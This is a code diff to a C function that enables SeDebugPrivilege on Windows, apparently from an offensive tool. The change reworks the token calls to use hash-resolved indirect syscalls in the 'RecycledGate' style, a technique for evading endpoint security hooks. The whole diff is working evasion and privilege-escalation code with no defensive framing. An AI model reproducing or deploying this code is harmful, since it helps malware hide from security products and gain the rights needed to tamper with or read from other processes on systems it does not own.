@@ -5,10 +5,22 @@ DWORD setDebugPrivilege(struct fPtrs* function_ptrs) {
 
     HANDLE hToken = NULL;
     TOKEN_PRIVILEGES TokenPrivileges = { 0 };
+    DWORD dwSuccess = FAIL;
 
-    NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
+    Syscall sysNtOpenProcessToken = { 0x00 }, sysNtAdjustPrivilegesToken = { 0x00 };
+    dwSuccess = getSyscall(0x3a92371d, &sysNtOpenProcessToken);
+    if (dwSuccess == FAIL)
+      goto exit;
+
+    dwSuccess = getSyscall(0x2863ba89, &sysNtAdjustPrivilegesToken);
+    if (dwSuccess == FAIL)
+      goto exit;
+
+    PrepareSyscall(sysNtOpenProcessToken.dwSyscallNr, sysNtOpenProcessToken.pRecycledGate);
+    NTSTATUS status = DoSyscall(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
     if (status != STATUS_SUCCESS) {
-        return FAIL;
+        dwSuccess = FAIL;
+        goto exit;
     }
 
     TokenPrivileges.PrivilegeCount = 1;
@@ -17,18 +29,25 @@ DWORD setDebugPrivilege(struct fPtrs* function_ptrs) {
     char debug_priv[] = "SeDebugPrivilege";
     if (!function_ptrs->_LookupPrivilegeValueA(NULL, debug_priv, &TokenPrivileges.Privileges[0].Luid)) {
         function_ptrs->_CloseHandle(hToken);
-        return FAIL;
+        dwSuccess = FAIL;
+        goto exit;
     }
 
-    status = NtAdjustPrivilegesToken(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+    PrepareSyscall(sysNtAdjustPrivilegesToken.dwSyscallNr, sysNtAdjustPrivilegesToken.pRecycledGate);
+    status = DoSyscall(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
     if (status != STATUS_SUCCESS) {
         function_ptrs->_CloseHandle(hToken);
-        return FAIL;
+        dwSuccess = FAIL;
+        goto exit;
     }
 
     function_ptrs->_CloseHandle(hToken);
 
-    return SUCCESS;
+    dwSuccess = SUCCESS;
+
+exit:
+
+    return dwSuccess;
 
 }
 
